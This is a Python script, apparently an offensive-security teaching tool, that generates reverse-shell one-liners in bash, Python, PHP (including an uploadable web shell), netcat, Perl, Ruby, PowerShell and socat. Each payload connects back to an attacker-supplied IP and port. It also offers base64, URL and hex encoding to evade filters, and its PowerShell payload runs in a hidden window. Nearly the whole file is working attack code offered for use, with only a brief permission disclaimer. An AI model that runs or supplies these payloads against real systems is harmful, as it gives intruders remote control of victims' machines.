"""
payload_gen.py — Reverse shell payload generator

WHY this exists:
  A reverse shell = the target machine connects BACK to you (the attacker).
  Why reverse? Because firewalls block incoming connections to target,
  but usually allow outbound. If you get RCE (Remote Code Execution),
  the target initiates the connection to your listener.

  LISTENER side (your machine): nc -lvnp <port>
  PAYLOAD side  (target):       this script generates the one-liner

  This doesn't exploit anything — it generates the command you'd run
  AFTER gaining execution (e.g. via RCE, upload, LFI + log poisoning).

KILL CHAIN PHASE: Post-Exploitation / Command & Control

USAGE:
  python payload_gen.py -i 10.10.14.5 -p 4444
  python payload_gen.py -i 10.10.14.5 -p 4444 --shell python3
  python payload_gen.py -i 10.10.14.5 -p 4444 --list
  python payload_gen.py -i 10.10.14.5 -p 4444 --encode base64

SETUP YOUR LISTENER FIRST:
  nc -lvnp 4444          (netcat — most common)
  rlwrap nc -lvnp 4444   (adds readline history to your shell)

ONLY use on systems you own or have written permission to test.
"""

import argparse
import base64
import urllib.parse


def gen_bash(ip: str, port: int) -> str:
    return f"bash -i >& /dev/tcp/{ip}/{port} 0>&1"


def gen_bash_196(ip: str, port: int) -> str:
    """Alternative bash using file descriptors — works when /dev/tcp is blocked."""
    return f"0<&196;exec 196<>/dev/tcp/{ip}/{port}; sh <&196 >&196 2>&196"


def gen_python3(ip: str, port: int) -> str:
    return (
        f'python3 -c \'import socket,subprocess,os;s=socket.socket();'
        f's.connect(("{ip}",{port}));'
        f'os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);'
        f'subprocess.call(["/bin/sh","-i"])\''
    )


def gen_python2(ip: str, port: int) -> str:
    return (
        f'python -c \'import socket,subprocess,os;s=socket.socket();'
        f's.connect(("{ip}",{port}));'
        f'os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);'
        f'subprocess.call(["/bin/sh","-i"])\''
    )


def gen_php(ip: str, port: int) -> str:
    return (
        f'php -r \'$sock=fsockopen("{ip}",{port});'
        f'exec("/bin/sh -i <&3 >&3 2>&3");\''
    )


def gen_php_web(ip: str, port: int) -> str:
    """Web-context PHP — useful when you can upload a .php file."""
    return (
        f'<?php exec("/bin/bash -c \'bash -i >&  /dev/tcp/{ip}/{port} 0>&1\'"); ?>'
    )


def gen_netcat(ip: str, port: int) -> str:
    return f"nc -e /bin/sh {ip} {port}"


def gen_netcat_mkfifo(ip: str, port: int) -> str:
    """For netcat versions without -e (most modern systems)."""
    return f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {ip} {port} >/tmp/f"


def gen_perl(ip: str, port: int) -> str:
    return (
        f'perl -e \'use Socket;$i="{ip}";$p={port};'
        f'socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));'
        f'if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,">&S");'
        f'open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");}}\''
    )


def gen_ruby(ip: str, port: int) -> str:
    return (
        f'ruby -rsocket -e\'f=TCPSocket.open("{ip}",{port}).to_i;'
        f'exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)\''
    )


def gen_powershell(ip: str, port: int) -> str:
    """Windows PowerShell reverse shell — useful on Windows targets."""
    ps = (
        f"$client = New-Object System.Net.Sockets.TCPClient('{ip}',{port});"
        f"$stream = $client.GetStream();"
        f"[byte[]]$bytes = 0..65535|%{{0}};"
        f"while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{"
        f"$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);"
        f"$sendback = (iex $data 2>&1 | Out-String );"
        f"$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';"
        f"$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);"
        f"$stream.Write($sendbyte,0,$sendbyte.Length);"
        f"$stream.Flush()}};"
        f"$client.Close()"
    )
    return f"powershell -nop -w hidden -e {base64.b64encode(ps.encode('utf-16-le')).decode()}"


def gen_socat(ip: str, port: int) -> str:
    return f"socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:{ip}:{port}"


SHELLS = {
    "bash":          gen_bash,
    "bash196":       gen_bash_196,
    "python3":       gen_python3,
    "python2":       gen_python2,
    "php":           gen_php,
    "php-web":       gen_php_web,
    "netcat":        gen_netcat,
    "nc-mkfifo":     gen_netcat_mkfifo,
    "perl":          gen_perl,
    "ruby":          gen_ruby,
    "powershell":    gen_powershell,
    "socat":         gen_socat,
}


def encode_payload(payload: str, encoding: str) -> str:
    """Apply encoding to evade basic filters / paste into certain contexts."""
    if encoding == "base64":
        return base64.b64encode(payload.encode()).decode()
    elif encoding == "url":
        return urllib.parse.quote(payload)
    elif encoding == "hex":
        return payload.encode().hex()
    return payload


def main():
    parser = argparse.ArgumentParser(description="Reverse shell payload generator")
    parser.add_argument("-i", "--ip", required=True, help="Your (attacker) IP — where the shell connects back to")
    parser.add_argument("-p", "--port", type=int, required=True, help="Listener port on your machine")
    parser.add_argument("--shell", default="all",
                        help=f"Shell type (default: all). Options: {', '.join(SHELLS.keys())}")
    parser.add_argument("--encode", choices=["base64", "url", "hex", "none"], default="none",
                        help="Encoding to apply to the payload")
    parser.add_argument("--list", action="store_true", help="List all available shell types")
    args = parser.parse_args()

    if args.list:
        print("\nAvailable shell types:")
        for name in SHELLS:
            print(f"  {name}")
        print(f"\nSet up listener: nc -lvnp {args.port}")
        return

    print(f"\n[*] Reverse shell payloads")
    print(f"[*] LHOST : {args.ip}")
    print(f"[*] LPORT : {args.port}")
    print(f"\n  Set up listener: nc -lvnp {args.port}")
    print("=" * 70)

    targets = SHELLS if args.shell == "all" else {args.shell: SHELLS.get(args.shell)}

    if None in targets.values():
        print(f"[-] Unknown shell type: {args.shell}")
        print(f"    Available: {', '.join(SHELLS.keys())}")
        return

    for name, gen_fn in targets.items():
        payload = gen_fn(args.ip, args.port)
        if args.encode != "none":
            encoded = encode_payload(payload, args.encode)
            print(f"\n[{name}] (raw)")
            print(f"  {payload}")
            print(f"[{name}] ({args.encode} encoded)")
            print(f"  {encoded}")
        else:
            print(f"\n[{name}]")
            print(f"  {payload}")

    print("\n" + "=" * 70)
    print("[*] Copy payload to target. Listener should be running first.")


if __name__ == "__main__":
    main()
